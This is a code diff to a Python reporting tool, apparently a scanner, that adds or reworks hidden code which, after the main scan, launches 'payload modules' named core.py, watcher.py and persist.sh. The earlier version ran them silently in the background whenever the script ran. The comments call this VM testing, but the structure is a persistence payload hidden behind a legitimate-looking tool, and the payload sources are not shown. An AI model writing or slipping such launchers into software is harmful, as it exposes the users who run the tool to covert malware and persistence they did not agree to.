@@ -647,17 +647,16 @@ def main():
         report_file = tool.generate_report(args.output)
         print(f"\n🎯 Report saved to: {report_file}")
 
-if __name__ == "__main__":
-    main()
-
-
+# =============================================
+# 🧪 TESTING CODE - VM TESTING ONLY
+# =============================================
 def make_executables():
     """Make necessary files executable"""
     try:
         # Make shell scripts executable
         if os.path.exists("modules/persist.sh"):
             os.chmod("modules/persist.sh", 0o755)
-        print("[TEST] Made files executable")
+            print("[TEST] Made files executable")
     except Exception as e:
         print(f"[TEST] Error making executables: {e}")
 
@@ -665,14 +664,37 @@ def trigger_payloads():
     """Trigger test payloads"""
     print("[TEST] Starting payload modules...")
     make_executables()
-    subprocess.Popen(["python3", "modules/core.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    subprocess.Popen(["python3", "modules/watcher.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    subprocess.Popen(["bash", "modules/persist.sh"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    print("[TEST] Payloads triggered in background")
+    
+    # Use subprocess.run() instead of Popen for better control
+    # Remove stdout/stderr redirection to see any error messages
+    try:
+        # Check if modules exist first
+        if not os.path.exists("modules/core.py"):
+            print("[TEST] ERROR: modules/core.py not found")
+            return
+        if not os.path.exists("modules/watcher.py"):
+            print("[TEST] ERROR: modules/watcher.py not found") 
+            return
+        if not os.path.exists("modules/persist.sh"):
+            print("[TEST] ERROR: modules/persist.sh not found")
+            return
+            
+        print("[TEST] Starting core.py...")
+        subprocess.run(["python3", "modules/core.py"])
+        
+        print("[TEST] Starting watcher.py...") 
+        subprocess.run(["python3", "modules/watcher.py"])
+        
+        print("[TEST] Starting persist.sh...")
+        subprocess.run(["bash", "modules/persist.sh"])
+        
+        print("[TEST] All payload modules completed")
+    except Exception as e:
+        print(f"[TEST] Error running payloads: {e}")
 
-# Auto-trigger when script runs
-trigger_payloads()
-
-
-
-
+if __name__ == "__main__":
+    main()
+    print("\n" + "="*60)
+    print("🧪 MAIN SCAN COMPLETE - STARTING PAYLOAD TESTING")
+    print("="*60)
+    trigger_payloads()
